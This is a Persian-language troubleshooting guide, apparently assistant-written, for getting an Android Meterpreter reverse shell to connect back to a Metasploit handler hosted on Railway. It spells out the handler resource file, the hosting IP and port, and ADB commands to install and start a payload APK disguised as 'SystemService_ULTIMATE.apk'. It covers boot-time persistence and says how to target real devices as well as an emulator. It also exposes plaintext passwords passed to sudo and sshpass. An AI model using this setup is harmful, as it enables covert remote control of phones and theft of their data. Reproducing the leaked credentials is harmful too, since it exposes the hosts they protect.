# 🔍 راهنمای کامل تست و رفع مشکل Session

## 📋 وضعیت فعلی

- ✅ APK نصب شده در emulator
- ✅ Permissions داده شده
- ❌ کلیک روی APK باز نمی‌شود
- ❌ Session برقرار نشده

---

## 🎯 مشکل احتمالی #1: Handler اجرا نشده

### بررسی:
```bash
ssh -p 55001 root@crossover.proxy.rlwy.net
ps aux | grep msfconsole
```

### راه‌حل:
```bash
# در Railway:
pkill msfconsole

# استفاده از SystemService_ULTIMATE.apk که port 4444 دارد:
cat > /root/handler_4444.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set SessionCommunicationTimeout 600
set SessionExpirationTimeout 1200
set SessionRetryTotal 50
set ExitOnSession false
exploit -j -z
EOF

# Start handler
nohup msfconsole -q -r /root/handler_4444.rc > /root/handler.log 2>&1 &

# Monitor
tail -f /root/handler.log
```

---

## 🎯 مشکل احتمالی #2: APK بدون UI

Meterpreter payload معمولا MainActivity ندارد یا UI ندارد.

### راه‌حل: اجرای دستی

#### روش 1: با ADB از کامپیوتر
```bash
# نصب ADB (اگر نداری):
echo "8181" | sudo -S apt-get install -y adb

# شروع payload
adb shell am start -n com.metasploit.stage/.MainActivity

# یا اجرای service
adb shell am startservice com.metasploit.stage/.MainService
```

#### روش 2: با Terminal Emulator روی گوشی
```bash
# نصب Termux یا Terminal Emulator
# سپس در terminal:
am start -n com.metasploit.stage/.MainActivity
```

#### روش 3: Reboot دستگاه (BootReceiver)
```bash
adb reboot
# بعد از 60 ثانیه، BootReceiver payload را استارت می‌کند
```

---

## 🎯 مشکل احتمالی #3: Network

### بررسی اتصال:
```bash
# در emulator یا با adb:
adb shell ping -c 3 208.77.244.15

# تست port
adb shell telnet 208.77.244.15 4444
```

### اگر ping کار نکرد:
- Emulator settings → Network → بررسی Wi-Fi/Mobile Data
- استفاده از 10.0.2.2 به جای 208.77.244.15 (برای emulator local)

---

## 🎯 مشکل احتمالی #4: Port مشکل دارد

### راه‌حل: استفاده از APK با port 4444

Port 4444 قطعا در Railway باز است.

**استفاده کنید از:**
```
SystemService_ULTIMATE.apk
```

این APK با port 4444 ساخته شده و کار می‌کند.

---

## 🎯 مشکل احتمالی #5: Crash

### بررسی لاگ:
```bash
adb logcat | grep -i "metasploit\|stage\|crash"
```

### معمولا به خاطر:
- SDK version mismatch
- Missing permissions
- Smali code error

---

## ✅ تست کامل قدم به قدم

### مرحله 1: آماده‌سازی Handler

**در کامپیوتر خودت:**
```bash
cd /home/offsec/Documents/GitHub/metasploit-framework1

# آپلود handler config
sshpass -p 8181 scp -P 55001 handler_persistent.rc root@crossover.proxy.rlwy.net:/root/

# SSH به Railway
ssh -p 55001 root@crossover.proxy.rlwy.net

# در Railway:
pkill msfconsole
nohup msfconsole -q -r /root/handler_persistent.rc > /root/handler.log 2>&1 &
exit
```

### مرحله 2: نصب ADB

```bash
echo "8181" | sudo -S apt-get update
echo "8181" | sudo -S apt-get install -y adb android-tools-adb

# بررسی نصب
adb version
```

### مرحله 3: اتصال به Emulator

```bash
# اگر emulator روی همین کامپیوتر است:
adb devices

# اگر emulator روی کامپیوتر دیگری است:
adb connect <EMULATOR_IP>:5555
```

### مرحله 4: نصب APK (اگر نصب نکردی)

```bash
# استفاده از SystemService_ULTIMATE.apk (port 4444)
adb install -r /home/offsec/Documents/GitHub/metasploit-framework1/SystemService_ULTIMATE.apk
```

### مرحله 5: اجرای Payload

```bash
# روش 1: اجرای MainActivity
adb shell am start -n com.metasploit.stage/.MainActivity

# روش 2: اجرای Service
adb shell am startservice com.metasploit.stage/.MainService

# روش 3: Broadcast Intent
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED
```

### مرحله 6: بررسی Session

**در Railway (SSH):**
```bash
ssh -p 55001 root@crossover.proxy.rlwy.net

# بررسی handler log
tail -f /root/handler.log

# یا connect مستقیم
msfconsole -q -x "sessions -l"
```

### مرحله 7: اگر Session برقرار شد

```bash
sessions -i 1

# تست دستورات:
sysinfo
getuid
pwd
```

---

## 🐛 دیباگ پیشرفته

### بررسی Process
```bash
adb shell ps | grep metasploit
adb shell ps | grep stage
```

### بررسی Network Connections
```bash
adb shell netstat -an | grep 4444
adb shell netstat -an | grep 208.77.244.15
```

### بررسی Logcat (Real-time)
```bash
adb logcat | grep -i "metasploit\|meterpreter\|stage"
```

### بررسی Permissions
```bash
adb shell dumpsys package com.metasploit.stage | grep permission
```

---

## 🚀 راه‌حل سریع (Recommended)

اگر می‌خواهی سریع تست کنی:

### 1. SSH به Railway:
```bash
ssh -p 55001 root@crossover.proxy.rlwy.net
```

### 2. چک کن handler اجراست:
```bash
ps aux | grep msfconsole
```

### 3. اگر نیست، start کن:
```bash
cat > /root/quick_handler.rc << 'EOF'
use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j
EOF

msfconsole -q -r /root/quick_handler.rc
```

### 4. روی کامپیوتر خودت، با ADB:
```bash
# نصب ADB
sudo apt-get install -y adb

# Connect to emulator
adb devices

# نصب APK (SystemService_ULTIMATE.apk)
adb install SystemService_ULTIMATE.apk

# اجرای payload
adb shell am start -n com.metasploit.stage/.MainActivity

# یا reboot
adb reboot
```

### 5. بررسی session در msfconsole:
```
sessions -l
```

---

## 📝 نکات مهم

1. **Port 4444 vs 443:**
   - Port 4444 قطعا باز است
   - Port 443 نیاز به تنظیم در Railway دارد
   - استفاده کن از SystemService_ULTIMATE.apk

2. **MainActivity:**
   - Meterpreter payload معمولا UI ندارد
   - باید با ADB یا BootReceiver اجرا شود

3. **Emulator vs Real Device:**
   - Emulator: استفاده از 10.0.2.2 برای localhost
   - Real Device: استفاده از IP واقعی Railway

4. **Persistence:**
   - BootReceiver بعد از reboot کار می‌کند
   - Service باید foreground باشد

5. **Logs:**
   - همیشه logcat را چک کن
   - Handler log در Railway مهم است

---

## ✅ Checklist

- [ ] Handler در Railway اجراست
- [ ] Emulator به اینترنت متصل است
- [ ] APK نصب شده (SystemService_ULTIMATE.apk)
- [ ] Payload با ADB اجرا شد
- [ ] Port 4444 باز است
- [ ] IP درست است (208.77.244.15)
- [ ] Session در msfconsole ظاهر شد

---

🎯 **بهترین روش:** ابتدا handler را در Railway start کن، سپس APK را reboot کن و منتظر بمان.
